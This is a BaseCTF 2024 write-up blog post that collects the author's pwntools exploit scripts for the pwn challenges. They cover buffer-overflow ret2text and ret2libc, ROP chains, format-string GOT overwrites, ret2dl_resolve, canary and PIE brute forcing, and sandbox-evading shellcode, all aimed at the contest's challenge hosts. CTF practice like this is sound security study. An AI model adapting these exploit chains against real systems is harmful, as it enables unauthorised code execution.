---
title: basectf2024-wp
date: 2024-09-16 22:08:24
category: wp
tags:
---

# pwn
## [Week1] Ret2text
### exp
```python
from pwn import *

p = remote('challenge.basectf.fun',34899)
back = 0x4011bb

payload = b'a'*40+p64(back)
p.send(payload)

p.interactive()
```

## [Week1] echo
### exp
```shell
echo $(<flag)
```

## [Week1] shellcode_level0
### exp
```python
from pwn import *

context.arch = "amd64"

#p = process("./shellcode_level0")
p = remote("challenge.basectf.fun",47064)

payload = asm(shellcraft.sh())
p.send(payload)

p.interactive()
```

## [Week1] 彻底失去她
### exp
```python
from pwn import *
from LibcSearcher import *

context.log_level = "debug"
context.terminal = ['tmux','splitw','-h']

p = process("./彻底失去她")
#p = remote("challenge.basectf.fun",23100)
elf = ELF("./彻底失去她")

pop_rdi = 0x401196
system_plt = 0x401080
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x401218
ret = 0x401264

payload = b'a'*18 + p64(pop_rdi) + p64(puts_got) + p64(ret) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil(b'your name?\n')
puts_addr = u64(p.recv()[:6].ljust(8,b'\x00'))
log.success(hex(puts_addr))

#libc_base = puts_addr - 0x80e50
#binsh = libc_base + 0x1d8678

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
binsh = libc_base + libc.dump('str_bin_sh')

payload2 = b'a'*18 + p64(pop_rdi) + p64(binsh) + p64(system_plt) + p64(main)
p.sendline(payload2)

p.interactive()
```

## [Week1] 我把她丢了
### exp
```python
from pwn import *

#p = process("./pwn")
p=remote("challenge.basectf.fun",47345)

pop_rdi = 0x401196
system = 0x40120f
binsh = 0x402008

payload = b'a'*120+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendline(payload)

p.interactive()
```

## [Week1] 签个到吧
### exp
```shell
nc ip port
```

## [Week2] format_string_level0
### exp
```python
from pwn import *

context.terminal = ['tmux','splitw','-h']

#p = process("./vuln")
p = remote("challenge.basectf.fun",40075)
elf = ELF("./vuln")

payload = b"%p "*7 + b"\n%s"
p.send(payload)

p.interactive()
```

## [Week2] format_string_level1
### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

#p = process("./vuln")
p = remote("challenge.basectf.fun",27841)
elf = ELF("./vuln")

target = 0x4040B0
#gdb.attach(p)
payload = b"%p"*7 + b"%n" + p64(target)
p.send(payload)

p.interactive()
```

## [Week2] gift
### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

p = process("./gift")
# p = remote("challenge.basectf.fun",35040)
elf = ELF("./gift")

syscall = 0x0000000000401ce4
pop_rdi = 0x0000000000401f2f # pop rdi ; ret
pop_rsi = 0x0000000000409f9e # pop rsi ; ret
pop_rdx_rbx = 0x000000000047f2eb # pop rdx ; pop rbx ; ret
pop_rax = 0x0000000000419484 # pop rax ; ret
mov_rsi_rax = 0x000000000044a5e5 # mov qword ptr [rsi], rax ; ret
addr = 0x4c6500 

payload  = b'a' * 40
payload += p64(pop_rsi) + p64(addr) + p64(pop_rax) + b'/bin/sh\0' + p64(mov_rsi_rax)
payload += p64(pop_rdi) + p64(addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall)
p.sendline(payload)

p.interactive()
```

## [Week2] shellcode_level1
### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

#p = process("./attachment")
p = remote('challenge.basectf.fun',20515)
elf = ELF("./attachment")

payload = asm('syscall')
p.send(payload)

payload = b'a'*2
payload += asm('''
        mov rbx, 0x0068732f6e69622f
        push rbx
        mov rdi,rsp
        mov rsi,0
        mov rdx,0
        mov rax,59
        syscall 
    ''')
p.send(payload)

p.interactive()
```

## [Week2] 她与你皆失
### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

#p = process("./pwn")
p = remote("challenge.basectf.fun",49599)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

main = 0x4011E3
pop_rdi = 0x0000000000401176 # pop rdi ; ret
pop_rdx = 0x0000000000401221 # pop rdx ; ret
pop_rsi = 0x0000000000401178 # pop rsi ; ret
ret = 0x000000000040101a # ret

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

p.recvuntil("do?\n")
payload  = b'a'*18
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload)
puts_addr = u64(p.recv()[:6].ljust(8,b'\0'))
log.success("puts_addr -> " + hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload  = b'a'*18
payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)
p.send(payload)

p.interactive()
```

## [Week3] PIE
### 分析
libc_start_call_main中一个神奇的gadget
改掉main函数的返回地址的最后一个byte即可调用到改gadget
从而再run一次main函数

### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

p = process("./vuln")
# p = remote("challenge.basectf.fun",20318)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

# 0x0000000000029d89 : mov rax, qword ptr [rsp + 8] ; call rax
payload = b'a'*256 + b'b'*8 + b'\x89'
p.send(payload)
p.recvuntil(b'b'*8)
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 0x029d89
log.success("libc_base -> " + hex(libc_base))

system_addr = libc_base + libc.sym['system']
binsh = libc_base + libc.search("/bin/sh\0").__next__()
pop_rdi = libc_base + 0x000000000002a3e5 # pop rdi ; ret
ret = pop_rdi + 1

payload = b'a'*256+ b'b'*8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)
p.send(payload)

p.interactive()
```

## [Week3] format_string_level2
### 分析
利用格式化字符串漏洞修改printf_got

### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

#p = process("./format_string_level2")
p = remote("challenge.basectf.fun",39839)
elf = ELF("./format_string_level2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

payload = b"%7$saaaa" + p64(printf_got)
p.send(payload)
printf_addr = u64(p.recv()[:6].ljust(8,b'\x00'))
log.success("printf_addr -> " + hex(printf_addr))

libc_base = printf_addr - 0x0606f0
log.success("libc_base -> " + hex(libc_base))

system_addr = libc_base + libc.sym['system']
system_byte = [
        (p64(system_addr)[0],0),
        (p64(system_addr)[1],1),
        (p64(system_addr)[2],2),
        ]

system_byte = sorted(system_byte)
print(system_byte)
#assert system_byte[0][0]<system_byte[1][0]<system_byte[2][0]<system_byte[3][0]<system_byte
assert system_byte[2][0] < (256-0x18-7)

payload = system_byte[0][0]*b'a'
payload += b"%35$hhn"
payload = payload.ljust(system_byte[1][0]+7,b'b')
payload += b"%36$hhn"
payload = payload.ljust(system_byte[2][0]+14,b'c')
payload += b"%37$hhn"
payload = payload.ljust(256-0x18,b'd')
payload += p64(printf_got+system_byte[0][1]) + p64(printf_got+system_byte[1][1]) + p64(printf_got+system_byte[2][1])

p.send(payload)

#gdb.attach(p)

p.recvuntil(b'd')
p.send(b'/bin/sh\0')

p.interactive()
```

## [Week3] stack_in_stack
### 分析
简单的栈迁移

### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

#p = process("./attachment")
p = remote("challenge.basectf.fun",37492)
elf = ELF("./attachment")
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

leave_ret = 0x4012F2
secert = 0x4011DD
read = 0x4012B5
ret = 0x4012F3
p.recvuntil(b'mick0960.\n')
buf = int(p.recvuntil(b'\n')[:-1],16)
log.success("buf -> " + hex(buf))

payload  = p64(0) + p64(secert) + p64(buf+0x30) + p64(read)
payload  = payload.ljust(48,b'a')
payload += p64(buf) + p64(leave_ret) 
p.send(payload)
puts_addr = int(p.recvuntil(b'\n')[:-1],16)
log.success("puts_addr -> " + hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
pop_rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search("/bin/sh\0"))

payload  = b'a'*24 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
p.send(payload)

p.interactive()
```

## [Week3] 五子棋
### exp
```python
from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

p = process("./pwn")
#p = remote()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")

p.sendline(b'0 0')
p.sendline(b'0 -5965')

p.interactive()
```

## [Week3] 你为什么不让我溢出
### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

#p = process("./你为什么不让我溢出")
p = remote("challenge.basectf.fun",20411)
elf = ELF("./你为什么不让我溢出")
#libc = ELF("./libc.so.6")

getshell = 0x4011BE

payload = b'a'*100+b'b'*5
p.send(payload)
p.recvuntil(b'b'*5)
canary = u64(p.recv(7).rjust(8,b'\x00'))
log.success("canary -> " + hex(canary))

#gdb.attach(p)

payload = b'a'*104 + p64(canary) + p64(0) + p64(getshell)
p.send(payload)

p.interactive()
```

## [Week4] ezstack
### 分析
ret2dl_resolve

### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

# p = process("./pwn")
p = remote("challenge.basectf.fun",32406)
elf = ELF("./pwn")
# libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

fakeLinkMap = elf.sym['a'] # write to where
rbp = fakeLinkMap-8
main = 0x40065d
pop_rdi = 0x00000000004006f3 # pop rdi ; ret
ret = 0x40068d

offset = libc.sym['system']-libc.sym['gets']
l_addr = offset if offset>=0 else (1<<64)+offset

linkmap = flat({
    0x0: p64(l_addr), # l_addr
    0x8: p64(0), # l_name
    0x10: p64(0), # l_ld
    0x18: p64(0), # l_next
    0x20: p64(0), # l_prev
    0x28: p64(0), # l_real
    0x30: p64(0), # l_ns
    0x38: p64(0), # l_libname
    0x40: p64(0), # l_info
    0x68: p64(fakeLinkMap+0x120), # l_info->DT_STRTAB
    0x70: p64(fakeLinkMap+0x110), # l_info->DT_SYMTAB
    0xf8: p64(fakeLinkMap+0x100), # l_info->DT_JMPREL
}, filler = b'\x00')

linkmap = linkmap.ljust(0x100,b'\x00')
linkmap += p64(0x17) # DT_JMPREL
linkmap += p64(fakeLinkMap+0x130) 
linkmap += p64(0x6) # DT_SYMTAB
linkmap += p64(elf.got['gets']-0x8) 
linkmap += p64(0x5) # DT_STRTAB
linkmap += p64(fakeLinkMap+0x150)
linkmap = linkmap.ljust(0x130,b'\x00')
linkmap += p64(fakeLinkMap+0x148-offset) # fake_JMPREL->r_offset
linkmap += p64(0x7) # fake_JMPREL->r_info
linkmap += p64(0) # fake_RMPREL->r_addend
linkmap += p64(0) # fake_got
linkmap = linkmap.ljust(0x150,b'\x00')
linkmap += b'/bin/sh\x00'

payload = b'a'*8
payload += p64(rbp)
 
#将FakeLinkMap写入bss段中
payload += p64(pop_rdi)
payload += p64(fakeLinkMap)
payload += p64(elf.plt['gets'])
#将FakeLinkMap写入bss段中
 
#将/bin/sh作为参数push进rdi
payload += p64(pop_rdi)
payload += p64(fakeLinkMap + 0x150)
#将/bin/sh作为参数push进rdi
 
# payload += p64(ret)#平衡栈,本题远程不需要但本地需要
payload += p64(0x4004E6)#跳转至plt0查询函数
payload += p64(fakeLinkMap)#fakeLinkMap作为l参数
payload += p64(0)#0为参数reloc_args
payload += p64(main)

p.sendline(payload)
p.sendline(linkmap)

p.interactive()
```

## [Week4] format_string_level3
### 分析
先利用格式化字符串漏洞修改stack_chk_fail_got，以便于任意次调用main函数
然后改掉printf_got

### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

p = process("./vuln")
# p = remote("challenge.basectf.fun",48553)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

stack_chk_fail_got = elf.got["__stack_chk_fail"]
printf_got = elf.got['printf']
main = 0x40121F

payload = b'a'*0x12
payload += b"%37$hhn"
payload = payload.ljust(0x1F+7,b'b')
payload += b"%38$hhn"
payload = payload.ljust(0x40+14,b'c')
payload += b"%39$n"
payload = payload.ljust(272-0x18,b'd')
payload += p64(stack_chk_fail_got+1) + p64(stack_chk_fail_got) + p64(stack_chk_fail_got+2)
p.send(payload)

p.recvuntil(b'd')
payload = b'e'*8
payload += b'%39$s'
payload = payload.ljust(272-0x8,b'f')
payload += p64(printf_got)
p.send(payload)
p.recvuntil(b'e'*8)
printf_addr = u64(p.recv()[:6].ljust(8,b'\x00'))
libc_base = printf_addr - libc.sym['printf']
log.success("libc_base -> " + hex(libc_base))

system_addr = libc_base + libc.sym['system']
system_byte = [
    (p64(system_addr)[0],0),
    (p64(system_addr)[1],1),
    (p64(system_addr)[2],2),
    (p64(system_addr)[3],3),
    (p64(system_addr)[4],4),
    (p64(system_addr)[5],5),
    ]
system_byte = sorted(system_byte)
print(system_byte)
assert system_byte[-1][0] < (272-0x30-7)

payload = system_byte[0][0]*b'g'
payload += b"%34$hhn"
payload = payload.ljust(system_byte[1][0]+7,b'h')
payload += b"%35$hhn"
payload = payload.ljust(system_byte[2][0]+14,b'i')
payload += b"%36$hhn"
payload = payload.ljust(system_byte[3][0]+21,b'j')
payload += b"%37$hhn"
payload = payload.ljust(system_byte[4][0]+28,b'k')
payload += b"%38$hhn"
payload = payload.ljust(system_byte[5][0]+35,b'l')
payload += b"%39$hhn"
payload = payload.ljust(272-0x30,b'm')
payload += p64(printf_got+system_byte[0][1]) + p64(printf_got+system_byte[1][1]) + p64(printf_got+system_byte[2][1])
payload += p64(printf_got+system_byte[3][1]) + p64(printf_got+system_byte[4][1]) + p64(printf_got+system_byte[5][1])

p.send(payload)

p.recvuntil(b'g')
p.send(b'/bin/sh')

p.interactive()
```

## [Week4] orz！
### 分析
沙箱禁用了execve、open、read、write
所以手写了openat、readw、writew的shellcode

### exp
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

#p = process("./orz！")
#p = gdb.debug("./orz！")
p = remote("challenge.basectf.fun",39482)
elf = ELF("./orz！")
#libc = ELF("./libc.so.6")

shellcode = '''
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
mov rdi,rax
push 0x100
mov rbx,rsp
sub rbx,0x108
push rbx
mov rsi,rsp
mov rdx,1
mov rax,19
syscall
mov rdi,1
mov rsi,rsp
mov rdx,1
mov rax,20
syscall
'''

shellcode = asm(shellcode)
p.send(shellcode)

p.interactive()
```

## [Week4] 没有 canary 我要死了!
### 分析
远程环境应该是ubuntu24.04

### exp
```python
from pwn import *
from ctypes import *

#context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

def exp():
    prog = "./没有canary我要死了"
    elf = ELF(prog)
    #p = process(prog)
    p = remote("challenge.basectf.fun",28733)

    libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    libc.srand(libc.time(0))

    canary = b'\x00'
    for i in range(2,9):
        for j in range(0,256):
            p.recvuntil(b'BaseCTF\n')
            test_canary = canary + j.to_bytes(1,'little')
            print(f"[\033[1;36mRunning\033[0m] explode the {i}th of canary, now try : {test_canary}")
            p.sendline(str(libc.rand()%50).encode())
            p.recvuntil(b'welcome\n')
            payload = b'a'*104 + test_canary
            p.send(payload)
            respone = p.recvline()
            if b'cheer on' in respone:
                canary = test_canary
                break
            else:
                if i==255:
                    print("[\033[1;31mError\033[0m] explode fail")
                    exit(-1)

    print(f"[\033[1;32mSuccess\033[0m] canary : {canary}")

    shell = 0x02b1
    p.recvuntil(b'BaseCTF\n')
    for pie in range(0,16):
        p.sendline(str(libc.rand()%50).encode())
        print(f"[\033[1;36mRunning\033[0m] explode pie, now try : {hex(pie)}")
        payload = b'a'*104 + canary + p64(0) + p16((pie<<0xc)+shell)
        p.recvuntil(b'welcome\n')
        p.send(payload)
        respone = p.recvline()
        if b"BaseCTF{" in respone:
            print(f"[\033[1;32mSuccess\033[0m] flag : {respone}")
            break

    p.interactive()

exp()
```
